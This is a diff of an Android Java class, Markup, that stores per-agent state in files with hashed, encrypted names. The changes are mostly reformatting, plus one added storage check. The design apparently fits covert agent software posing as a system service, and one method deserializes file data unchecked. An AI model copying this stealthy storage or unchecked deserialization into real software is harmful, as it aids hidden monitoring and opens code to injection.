@@ -19,7 +19,6 @@ import java.io.ObjectOutputStream;
 
 import java.io.Serializable;
 
-
 import android.util.Log;
 
 import com.android.service.agent.AgentType;
@@ -91,8 +90,9 @@ public class Markup {
 	 * @return the string
 	 */
 	static String makeMarkupName(String agentId, final boolean addPath) {
-		//final String markupName = Integer.toHexString(agentId);
-		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes()));
+		// final String markupName = Integer.toHexString(agentId);
+		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId
+				.getBytes()));
 		Check.requires(markupName != null, "null markupName");
 		Check.requires(markupName != "", "empty markupName");
 
@@ -102,7 +102,8 @@ public class Markup {
 			encName = Path.markup();
 		}
 
-		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, getMarkupSeed());
+		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION,
+				getMarkupSeed());
 
 		Check.asserts(markupInit, "makeMarkupName: " + markupInit);
 		return encName;
@@ -220,7 +221,8 @@ public class Markup {
 
 			return plain;
 		} else {
-			Log.d("QZ", TAG + " Error (readMarkup): Markup file does not exists");
+			Log.d("QZ", TAG
+					+ " Error (readMarkup): Markup file does not exists");
 			return null;
 		}
 	}
@@ -254,6 +256,9 @@ public class Markup {
 		final String markupName = makeMarkupName(agentId, true);
 
 		Check.asserts(markupName != "", "markupName empty");
+		if (!Path.haveStorage()) {
+			return false;
+		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
 
@@ -271,18 +276,19 @@ public class Markup {
 
 		return fileRet.exists();
 	}
-	
-	public synchronized boolean writeMarkupSerializable(final Serializable object) throws IOException {
-	
+
+	public synchronized boolean writeMarkupSerializable(
+			final Serializable object) throws IOException {
+
 		ByteArrayOutputStream bos = new ByteArrayOutputStream();
-		ObjectOutput out = new ObjectOutputStream(bos);   
+		ObjectOutput out = new ObjectOutputStream(bos);
 		out.writeObject(object);
-		byte[] data = bos.toByteArray(); 
+		byte[] data = bos.toByteArray();
 		return writeMarkup(data);
-		
+
 	}
-	
-	public synchronized Object readMarkupSerializable() throws IOException{
+
+	public synchronized Object readMarkupSerializable() throws IOException {
 		byte[] data = readMarkup();
 		ByteArrayInputStream bis = new ByteArrayInputStream(data);
 		ObjectInput in = new ObjectInputStream(bis);
@@ -294,6 +300,5 @@ public class Markup {
 			throw new IOException();
 		}
 	}
-		
 
 }
